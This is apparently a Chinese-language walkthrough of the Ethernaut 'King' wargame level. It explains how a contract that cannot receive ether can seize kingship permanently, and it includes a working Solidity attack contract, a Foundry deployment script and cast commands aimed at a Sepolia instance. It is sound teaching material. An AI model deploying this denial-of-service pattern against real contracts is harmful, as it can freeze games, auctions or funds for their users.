# King 

# King wp

## 目标合约

目标:成为国王并阻止别人成为新的国王

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king; //0
    uint256 public prize; //1
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value; //发送的 ETH 数量（单位：wei）
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
//0xcB99AE44ef0cFb88F0AB26c6916E63C7a3174F3F
```

## 目标合约分析

合约有一个`receive()`函数,要求`msg.sender`是`ownner`(就是当前的king)**或**`msg.value>=value`

这里是向king转钱,用的transfer

```solidity
 payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
```

* transfer用法：**<font style="background-color:#f3bb2f;">接收方地址.transfer(发送ETH的数额)</font>**

然后会把`msg.sender`设为新king,`mag.value`设为新prize

所以要成为新king,需要读取一下当前prize是多少,再转比这个prize多的数额就能成为新king

然后还需要解决阻止别人成为新king这个问题,注意这里用的是**transfer**,也就意味着如果别人**转账失败**的话会revert,他就成为不了新king了

**转账失败**的方法就是攻击合约里不要写`fallback()`或者`receive()`,这样后来有人想成为新king的话,向攻击合约转账,是无法转账成功的

## 思路

1. 读取当前的prize
2. 写个攻击合约,转比prize多的`msg.value`,让攻击合约成为新king

## 读取prize

prize是public状态变量,部署时会自动生成同名函数,所以这里用cast call读取一下

```solidity
cast call 0xcB99AE44ef0cFb88F0AB26c6916E63C7a3174F3F "prize()" --rpc-url $SEPOLIA_RPC
```

得到0x00000000000000000000000000000000000000000000000000038d7ea4c68000

转换成ether单位：

```solidity
cast from-wei 0x00000000000000000000000000000000000000000000000000038d7ea4c68000
```

得到**0.001(ether)**,就是当前prize的值

!\[]\(C:\Users\HUAWEI\Pictures\Screenshots\屏幕截图 2025-05-31 144116.png)

## 攻击合约

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {King} from "../src/King.sol";

contract Attack {
    constructor(address payable addr) payable {
        //King(addr).prize();//读取prize值,我给注释掉了,直接用cast call了
        (bool ok, ) = addr.call{value: 0.0011 ether}("");
        require(ok, "no");
    }
}
```

部署时要给攻击合约0.0011ether,用来给king转钱

* call用法：**<font style="background-color:#f3bb2f;">接收方地址.call{value: 发送ETH数额}("")</font>**

## 脚本

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Attack} from "../src/Attack.sol";

contract Attacksc is Script {
    function run() external {
        address payable jiyi = payable(
            0xcB99AE44ef0cFb88F0AB26c6916E63C7a3174F3F
        );//把实例地址转为payable类型,方便转钱,同时创建了jiyi变量
        vm.startBroadcast();
        new Attack{value: 0.0011 ether}(jiyi);//攻击合约给jiyi(也就是king)转0.0011ether
        vm.stopBroadcast();
    }
}
```


> 更新: 2025-07-09 11:26:49  
> 原文: <https://www.yuque.com/xiaoyuhushenfu/yzin4n/ohf3hkoq9qv1a06f>